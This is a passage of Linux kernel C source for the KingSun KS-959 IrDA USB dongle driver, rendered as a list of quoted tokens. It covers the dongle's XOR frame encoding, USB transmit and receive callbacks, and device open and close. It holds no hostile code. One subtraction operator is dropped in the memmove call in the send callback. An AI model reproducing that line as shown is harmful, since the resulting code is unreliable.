"known", "on", "what", "changes", "(", "if", "any", ")", "must", "be", "done", "to", "frame", "wrapping", "/", "*", "unwrapping", "for", "higher", "than", "SIR", "speeds", ".", "This", "driver", "assumes", "no", "change", "is", "*", "necessary", "and", "announces", "support", "for", "all", "the", "way", "to", "57600", "bps", ".", "Although", "the", "*", "package", "announces", "support", "for", "up", "to", "4MBps", ",", "tests", "with", "a", "Sony", "Ericcson", "K300", "*", "phone", "show", "corruption", "when", "receiving", "large", "frames", "at", "115200", "bps", ",", "the", "highest", "*", "speed", "announced", "by", "the", "phone", ".", "However", ",", "transmission", "at", "115200", "bps", "is", "OK", ".", "Go", "*", "figure", ".", "Since", "I", "don", "'", "t", "know", "whether", "the", "phone", "or", "the", "dongle", "is", "at", "fault", ",", "max", "*", "announced", "speed", "is", "57600", "bps", "until", "someone", "produces", "a", "device", "that", "can", "run", "*", "at", "higher", "speeds", "with", "this", "dongle", ".", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "errno", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "usb", ".", "h", ">", "#", "include", "<", "linux", "/", "device", ".", "h", ">", "#", "include", "<", "linux", "/", "crc32", ".", "h", ">", "#", "include", "<", "asm", "/", "unaligned", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "crc", ".", "h", ">", "#", "define", "KS959_VENDOR_ID", "0x07d0", "#", "define", "KS959_PRODUCT_ID", "0x4959", "/", "*", "These", "are", "the", "currently", "known", "USB", "ids", "*", "/", "static", "const", "struct", "usb_device_id", "dongles", "[", "]", "=", "{", "/", "*", "KingSun", "Co", ",", "Ltd", "IrDA", "/", "USB", "Bridge", "*", "/", "{", "USB_DEVICE", "(", "KS959_VENDOR_ID", ",", "KS959_PRODUCT_ID", ")", "},", "{", "}", "}", ";", "MODULE_DEVICE_TABLE", "(", "usb", ",", "dongles", ")", ";", "#", "define", "KINGSUN_MTT", "0x07", "#", "define", "KINGSUN_REQ_RECV", "0x01", "#", "define", "KINGSUN_REQ_SEND", "0x09", "#", "define", "KINGSUN_RCV_FIFO_SIZE", "2048", "/", "*", "Max", "length", "we", "can", "receive", "*", "/", "#", "define", "KINGSUN_SND_FIFO_SIZE", "2048", "/", "*", "Max", "packet", "we", "can", "send", "*", "/", "#", "define", "KINGSUN_SND_PACKET_SIZE", "256", "/", "*", "Max", "packet", "dongle", "can", "handle", "*", "/", "struct", "ks959_speedparams", "{", "__le32", "baudrate", ";", "/", "*", "baud", "rate", ",", "little", "endian", "*", "/", "__u8", "flags", ";", "__u8", "reserved", "[", "3", "]", ";", "}", "__packed", ";", "#", "define", "KS_DATA_5_BITS", "0x00", "#", "define", "KS_DATA_6_BITS", "0x01", "#", "define", "KS_DATA_7_BITS", "0x02", "#", "define", "KS_DATA_8_BITS", "0x03", "#", "define", "KS_STOP_BITS_1", "0x00", "#", "define", "KS_STOP_BITS_2", "0x08", "#", "define", "KS_PAR_DISABLE", "0x00", "#", "define", "KS_PAR_EVEN", "0x10", "#", "define", "KS_PAR_ODD", "0x30", "#", "define", "KS_RESET", "0x80", "struct", "ks959_cb", "{", "struct", "usb_device", "*", "usbdev", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "network", "layer", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "struct", "usb_ctrlrequest", "*", "tx_setuprequest", ";", "struct", "urb", "*", "tx_urb", ";", "__u8", "*", "tx_buf_clear", ";", "unsigned", "int", "tx_buf_clear_used", ";", "unsigned", "int", "tx_buf_clear_sent", ";", "__u8", "*", "tx_buf_xored", ";", "struct", "usb_ctrlrequest", "*", "rx_setuprequest", ";", "struct", "urb", "*", "rx_urb", ";", "__u8", "*", "rx_buf", ";", "__u8", "rx_variable_xormask", ";", "iobuff_t", "rx_unwrap_buff", ";", "struct", "usb_ctrlrequest", "*", "speed_setuprequest", ";", "struct", "urb", "*", "speed_urb", ";", "struct", "ks959_speedparams", "speedparams", ";", "unsigned", "int", "new_speed", ";", "spinlock_t", "lock", ";", "int", "receiving", ";", "}", ";", "/", "*", "Procedure", "to", "perform", "the", "obfuscation", "/", "padding", "expected", "by", "the", "dongle", "*", "*", "buf_cleartext", "(", "IN", ")", "Cleartext", "version", "of", "the", "IrDA", "frame", "to", "transmit", "*", "len_cleartext", "(", "IN", ")", "Length", "of", "the", "cleartext", "version", "of", "IrDA", "frame", "*", "buf_xoredtext", "(", "OUT", ")", "Obfuscated", "version", "of", "frame", "built", "by", "proc", "*", "len_maxbuf", "(", "OUT", ")", "Maximum", "space", "available", "at", "buf_xoredtext", "*", "*", "(", "return", ")", "length", "of", "obfuscated", "frame", "with", "padding", "*", "*", "If", "not", "enough", "space", "(", "as", "indicated", "by", "len_maxbuf", "vs", ".", "required", "padding", ")", ",", "*", "zero", "is", "returned", "*", "*", "The", "value", "of", "lookup_string", "is", "actually", "a", "required", "portion", "of", "the", "algorithm", ".", "*", "Seems", "the", "designer", "of", "the", "dongle", "wanted", "to", "state", "who", "exactly", "is", "responsible", "*", "for", "implementing", "obfuscation", ".", "Send", "your", "best", "(", "or", "other", ")", "wishes", "to", "him", "]", ":-", ")", "*", "/", "static", "unsigned", "int", "obfuscate_tx_buffer", "(", "const", "__u8", "*", "buf_cleartext", ",", "unsigned", "int", "len_cleartext", ",", "__u8", "*", "buf_xoredtext", ",", "unsigned", "int", "len_maxbuf", ")", "{", "unsigned", "int", "len_xoredtext", ";", "/", "*", "Calculate", "required", "length", "with", "padding", ",", "check", "for", "necessary", "space", "*", "/", "len_xoredtext", "=", "(", "(", "len_cleartext", "+", "7", ")", "&", "~", "0x7", ")", "+", "0x10", ";", "if", "(", "len_xoredtext", "<", "=", "len_maxbuf", ")", "{", "static", "const", "__u8", "lookup_string", "[", "]", "=", "\"", "wangshuofei19710", "\"", ";", "__u8", "xor_mask", ";", "/", "*", "Unlike", "the", "WinXP", "driver", ",", "we", "*", "do", "*", "clear", "out", "the", "padding", "*", "/", "memset", "(", "buf_xoredtext", ",", "0", ",", "len_xoredtext", ")", ";", "xor_mask", "=", "lookup_string", "[", "(", "len_cleartext", "&", "0x0f", ")", "^", "0x06", "]", "^", "0x55", ";", "while", "(", "len_cleartext", "-", "-", ">", "0", ")", "{", "*", "buf_xoredtext", "+", "+", "=", "*", "buf_cleartext", "+", "+", "^", "xor_mask", ";", "}", "}", "else", "{", "len_xoredtext", "=", "0", ";", "}", "return", "len_xoredtext", ";", "}", "/", "*", "Callback", "transmission", "routine", "*", "/", "static", "void", "ks959_speed_irq", "(", "struct", "urb", "*", "urb", ")", "{", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "urb", "-", ">", "dev", "-", ">", "dev", ",", "\"", "ks959_speed_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "}", "}", "/", "*", "Send", "a", "control", "request", "to", "change", "speed", "of", "the", "dongle", "*", "/", "static", "int", "ks959_change_speed", "(", "struct", "ks959_cb", "*", "kingsun", ",", "unsigned", "speed", ")", "{", "static", "unsigned", "int", "supported_speeds", "[", "]", "=", "{", "2400", ",", "9600", ",", "19200", ",", "38400", ",", "57600", ",", "115200", ",", "576000", ",", "1152000", ",", "4000000", ",", "0", "}", ";", "int", "err", ";", "unsigned", "int", "i", ";", "if", "(", "kingsun", "-", ">", "speed_setuprequest", "=", "=", "NULL", "|", "|", "kingsun", "-", ">", "speed_urb", "=", "=", "NULL", ")", "return", "-", "ENOMEM", ";", "/", "*", "Check", "that", "requested", "speed", "is", "among", "the", "supported", "ones", "*", "/", "for", "(", "i", "=", "0", ";", "supported_speeds", "[", "i", "]", "&", "&", "supported_speeds", "[", "i", "]", "!", "=", "speed", ";", "i", "+", "+)", ";", "if", "(", "supported_speeds", "[", "i", "]", "=", "=", "0", ")", "return", "-", "EOPNOTSUPP", ";", "memset", "(", "&(", "kingsun", "-", ">", "speedparams", ")", ",", "0", ",", "sizeof", "(", "struct", "ks959_speedparams", ")", ");", "kingsun", "-", ">", "speedparams", ".", "baudrate", "=", "cpu_to_le32", "(", "speed", ")", ";", "kingsun", "-", ">", "speedparams", ".", "flags", "=", "KS_DATA_8_BITS", ";", "/", "*", "speed_setuprequest", "pre", "-", "filled", "in", "ks959_probe", "*", "/", "usb_fill_control_urb", "(", "kingsun", "-", ">", "speed_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_sndctrlpipe", "(", "kingsun", "-", ">", "usbdev", ",", "0", ")", ",", "(", "unsigned", "char", "*", ")", "kingsun", "-", ">", "speed_setuprequest", ",", "&", "(", "kingsun", "-", ">", "speedparams", ")", ",", "sizeof", "(", "struct", "ks959_speedparams", ")", ",", "ks959_speed_irq", ",", "kingsun", ")", ";", "kingsun", "-", ">", "speed_urb", "-", ">", "status", "=", "0", ";", "err", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "speed_urb", ",", "GFP_ATOMIC", ")", ";", "return", "err", ";", "}", "/", "*", "Submit", "one", "fragment", "of", "an", "IrDA", "frame", "to", "the", "dongle", "*", "/", "static", "void", "ks959_send_irq", "(", "struct", "urb", "*", "urb", ")", ";", "static", "int", "ks959_submit_tx_fragment", "(", "struct", "ks959_cb", "*", "kingsun", ")", "{", "unsigned", "int", "padlen", ";", "unsigned", "int", "wraplen", ";", "int", "ret", ";", "/", "*", "Check", "whether", "current", "plaintext", "can", "produce", "a", "padded", "buffer", "that", "fits", "within", "the", "range", "handled", "by", "the", "dongle", "*", "/", "wraplen", "=", "(", "KINGSUN_SND_PACKET_SIZE", "&", "~", "0x7", ")", "-", "0x10", ";", "if", "(", "wraplen", ">", "kingsun", "-", ">", "tx_buf_clear_used", ")", "wraplen", "=", "kingsun", "-", ">", "tx_buf_clear_used", ";", "/", "*", "Perform", "dongle", "obfuscation", ".", "Also", "remove", "the", "portion", "of", "the", "frame", "that", "was", "just", "obfuscated", "and", "will", "now", "be", "sent", "to", "the", "dongle", ".", "*", "/", "padlen", "=", "obfuscate_tx_buffer", "(", "kingsun", "-", ">", "tx_buf_clear", ",", "wraplen", ",", "kingsun", "-", ">", "tx_buf_xored", ",", "KINGSUN_SND_PACKET_SIZE", ")", ";", "/", "*", "Calculate", "how", "much", "data", "can", "be", "transmitted", "in", "this", "urb", "*", "/", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "wValue", "=", "cpu_to_le16", "(", "wraplen", ")", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "wLength", "=", "cpu_to_le16", "(", "padlen", ")", ";", "/", "*", "Rest", "of", "the", "fields", "were", "filled", "in", "ks959_probe", "*", "/", "usb_fill_control_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_sndctrlpipe", "(", "kingsun", "-", ">", "usbdev", ",", "0", ")", ",", "(", "unsigned", "char", "*", ")", "kingsun", "-", ">", "tx_setuprequest", ",", "kingsun", "-", ">", "tx_buf_xored", ",", "padlen", ",", "ks959_send_irq", ",", "kingsun", ")", ";", "kingsun", "-", ">", "tx_urb", "-", ">", "status", "=", "0", ";", "ret", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "GFP_ATOMIC", ")", ";", "/", "*", "Remember", "how", "much", "data", "was", "sent", ",", "in", "order", "to", "update", "at", "callback", "*", "/", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "(", "ret", "=", "=", "0", ")", "?", "wraplen", ":", "0", ";", "return", "ret", ";", "}", "/", "*", "Callback", "transmission", "routine", "*", "/", "static", "void", "ks959_send_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "struct", "net_device", "*", "netdev", "=", "kingsun", "-", ">", "netdev", ";", "int", "ret", "=", "0", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ks959_send_irq", ":", "Network", "not", "running", "!", "\\", "n", "\"", ");", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ks959_send_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "return", ";", "}", "if", "(", "kingsun", "-", ">", "tx_buf_clear_used", ">", "0", ")", "{", "/", "*", "Update", "data", "remaining", "to", "be", "sent", "*", "/", "if", "(", "kingsun", "-", ">", "tx_buf_clear_sent", "<", "kingsun", "-", ">", "tx_buf_clear_used", ")", "{", "memmove", "(", "kingsun", "-", ">", "tx_buf_clear", ",", "kingsun", "-", ">", "tx_buf_clear", "+", "kingsun", "-", ">", "tx_buf_clear_sent", ",", "kingsun", "-", ">", "tx_buf_clear_used", "kingsun", "-", ">", "tx_buf_clear_sent", ")", ";", "}", "kingsun", "-", ">", "tx_buf_clear_used", "-", "=", "kingsun", "-", ">", "tx_buf_clear_sent", ";", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "0", ";", "if", "(", "kingsun", "-", ">", "tx_buf_clear_used", ">", "0", ")", "{", "/", "*", "There", "is", "more", "data", "to", "be", "sent", "*", "/", "if", "(", "(", "ret", "=", "ks959_submit_tx_fragment", "(", "kingsun", ")", ")", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ks959_send_irq", ":", "failed", "tx_urb", "submit", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "netdev", ")", ";", "}", "}", "}", "else", "{", "/", "*", "All", "data", "sent", ",", "send", "next", "speed", "&", "&", "wake", "network", "queue", "*", "/", "if", "(", "kingsun", "-", ">", "new_speed", "!", "=", "-", "1", "&", "&", "cpu_to_le32", "(", "kingsun", "-", ">", "new_speed", ")", "!", "=", "kingsun", "-", ">", "speedparams", ".", "baudrate", ")", "ks959_change_speed", "(", "kingsun", ",", "kingsun", "-", ">", "new_speed", ")", ";", "netif_wake_queue", "(", "netdev", ")", ";", "}", "}", "}", "/", "*", "*", "Called", "from", "net", "/", "core", "when", "new", "frame", "is", "available", ".", "*", "/", "static", "netdev_tx_t", "ks959_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ks959_cb", "*", "kingsun", ";", "unsigned", "int", "wraplen", ";", "int", "ret", "=", "0", ";", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "the", "IRDA", "wrapping", "routines", "don", "'", "t", "deal", "with", "non", "linear", "skb", "*", "/", "SKB_LINEAR_ASSERT", "(", "skb", ")", ";", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "spin_lock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "kingsun", "-", ">", "new_speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "/", "*", "Append", "data", "to", "the", "end", "of", "whatever", "data", "remains", "to", "be", "transmitted", "*", "/", "wraplen", "=", "async_wrap_skb", "(", "skb", ",", "kingsun", "-", ">", "tx_buf_clear", ",", "KINGSUN_SND_FIFO_SIZE", ")", ";", "kingsun", "-", ">", "tx_buf_clear_used", "=", "wraplen", ";", "if", "(", "(", "ret", "=", "ks959_submit_tx_fragment", "(", "kingsun", ")", ")", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ks959_hard_xmit", ":", "failed", "tx_urb", "submit", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "netdev", ")", ";", "}", "}", "else", "{", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "spin_unlock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "Receive", "callback", "function", "*", "/", "static", "void", "ks959_rcv_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "int", "ret", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "{", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "kingsun_rcv_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "if", "(", "urb", "-", ">", "actual_length", ">", "0", ")", "{", "__u8", "*", "bytes", "=", "urb", "-", ">", "transfer_buffer", ";", "unsigned", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "urb", "-", ">", "actual_length", ";", "i", "+", "+)", "{", "/", "*", "De", "-", "obfuscation", "implemented", "here", ":", "variable", "portion", "of", "xormask", "is", "incremented", ",", "and", "then", "used", "with", "the", "encoded", "byte", "for", "the", "XOR", ".", "The", "result", "of", "the", "operation", "is", "used", "to", "unwrap", "the", "SIR", "frame", ".", "*", "/", "kingsun", "-", ">", "rx_variable_xormask", "+", "+;", "bytes", "[", "i", "]", "=", "bytes", "[", "i", "]", "^", "kingsun", "-", ">", "rx_variable_xormask", "^", "0x55u", ";", "/", "*", "rx_variable_xormask", "doubles", "as", "an", "index", "counter", "so", "we", "can", "skip", "the", "byte", "at", "0xff", "(", "wrapped", "around", "to", "0", ")", ".", "*", "/", "if", "(", "kingsun", "-", ">", "rx_variable_xormask", "!", "=", "0", ")", "{", "async_unwrap_char", "(", "kingsun", "-", ">", "netdev", ",", "&", "kingsun", "-", ">", "netdev", "-", ">", "stats", ",", "&", "kingsun", "-", ">", "rx_unwrap_buff", ",", "bytes", "[", "i", "]", ");", "}", "}", "kingsun", "-", ">", "receiving", "=", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ")", "?", "1", ":", "0", ";", "}", "/", "*", "This", "urb", "has", "already", "been", "filled", "in", "kingsun_net_open", ".", "Setup", "packet", "must", "be", "re", "-", "filled", ",", "but", "it", "is", "assumed", "that", "urb", "keeps", "the", "pointer", "to", "the", "initial", "setup", "packet", ",", "as", "well", "as", "the", "payload", "buffer", ".", "Setup", "packet", "is", "already", "pre", "-", "filled", "at", "ks959_probe", ".", "*", "/", "urb", "-", ">", "status", "=", "0", ";", "ret", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "}", "/", "*", "*", "Function", "kingsun_net_open", "(", "dev", ")", "*", "*", "Network", "device", "is", "taken", "up", ".", "Usually", "this", "is", "done", "by", "\"", "ifconfig", "irda0", "up", "\"", "*", "/", "static", "int", "ks959_net_open", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "err", "=", "-", "ENOMEM", ";", "char", "hwname", "[", "16", "]", ";", "/", "*", "At", "this", "point", ",", "urbs", "are", "NULL", ",", "and", "skb", "is", "NULL", "(", "see", "kingsun_probe", ")", "*", "/", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Initialize", "for", "SIR", "to", "copy", "data", "directly", "into", "skb", ".", "*", "/", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "truesize", "=", "IRDA_SKB_MAX_MTU", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "dev_alloc_skb", "(", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", "goto", "free_mem", ";", "skb_reserve", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ",", "1", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "-", ">", "data", ";", "kingsun", "-", ">", "rx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_urb", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "tx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_urb", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "speed_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "speed_urb", ")", "goto", "free_mem", ";", "/", "*", "Initialize", "speed", "for", "dongle", "*", "/", "kingsun", "-", ">", "new_speed", "=", "9600", ";", "err", "=", "ks959_change_speed", "(", "kingsun", ",", "9600", ")", ";", "if", "(", "err", "<", "0", ")", "goto", "free_mem", ";", "/", "*", "*", "Now", "that", "everything", "should", "be", "initialized", "properly", ",", "*", "Open", "new", "IrLAP", "layer", "instance", "to", "take", "care", "of", "us", ".", "..", "*", "/", "sprintf", "(", "hwname", ",", "\"", "usb", "#", "%", "d", "\"", ",", "kingsun", "-", ">", "usbdev", "-", ">", "devnum", ")", ";", "kingsun", "-", ">", "irlap", "=", "irlap_open", "(", "netdev", ",", "&", "kingsun", "-", ">", "qos", ",", "hwname", ")", ";", "if", "(", "!", "kingsun", "-", ">", "irlap", ")", "{", "err", "=", "-", "ENOMEM", ";", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "irlap_open", "failed", "\\", "n", "\"", ");", "goto", "free_mem", ";", "}", "/", "*", "Start", "reception", ".", "Setup", "request", "already", "pre", "-", "filled", "in", "ks959_probe", "*", "/", "usb_fill_control_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_rcvctrlpipe", "(", "kingsun", "-", ">", "usbdev", ",", "0", ")", ",", "(", "unsigned", "char", "*", ")", "kingsun", "-", ">", "rx_setuprequest", ",", "kingsun", "-", ">", "rx_buf", ",", "KINGSUN_RCV_FIFO_SIZE", ",", "ks959_rcv_irq", ",", "kingsun", ")", ";", "kingsun", "-", ">", "rx_urb", "-", ">", "status", "=", "0", ";", "err", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "if", "(", "err", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "first", "urb", "-", "submit", "failed", ":", "%", "d", "\\", "n", "\"", ",", "err", ")", ";", "goto", "close_irlap", ";", "}", "netif_start_queue", "(", "netdev", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "urbs", "allocated", "and", "ready", "to", "fill", "-", "max", "rx", "packet", "known", "(", "in", "max_rx", ")", "-", "unwrap", "state", "machine", "initialized", ",", "in", "state", "outside", "of", "any", "frame", "-", "receive", "request", "in", "progress", "-", "IrLAP", "layer", "started", ",", "about", "to", "hand", "over", "packets", "to", "send", "*", "/", "return", "0", ";", "close_irlap", ":", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "free_mem", ":", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "if", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", "{", "kfree_skb", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "NULL", ";", "}", "return", "err", ";", "}", "/", "*", "*", "Function", "kingsun_net_close", "(", "kingsun", ")", "*", "*", "Network", "device", "is", "taken", "down", ".", "Usually", "this", "is", "done", "by", "*", "\"", "ifconfig", "irda0", "down", "\"", "*", "/", "static", "int", "ks959_net_close", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "/", "*", "Stop", "transmit", "processing", "*", "/", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kfree_skb", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "kingsun", "-", ">", "irlap", ")", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "return", "0", ";", "}", "/", "*", "*", "IOCTLs", ":", "Extra", "out", "-", "of", "-", "band", "network", "commands", ".", "..", "*", "/", "static", "int", "ks959_net_ioctl", "(", "struct", "net_device", "*", "netdev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "ks959_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "ret", "=", "0", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "device", "is", "still", "there", "*", "/", "if", "(", "netif_device_present", "(", "kingsun", "-", ">", "netdev", ")", ")", "return", "ks959_change_speed", "(", "kingsun", ",", "irq", "-", ">", "ifr_baudrate", ")", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "IrDA", "stack", "is", "still", "there", "*", "/", "if", "(", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "irda_device_set_media_busy", "(", "kingsun", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Only", "approximately", "true", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "kingsun", "-", ">", "receiving", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "static", "const", "struct", "net_device_ops", "ks959_ops", "=", "{", ".", "ndo_start_xmit", "=", "ks959_hard_xmit", ",", ".", "ndo_open", "=", "ks959_net_open", ",", ".", "ndo_stop", "=", "ks959_net_close", ",", ".", 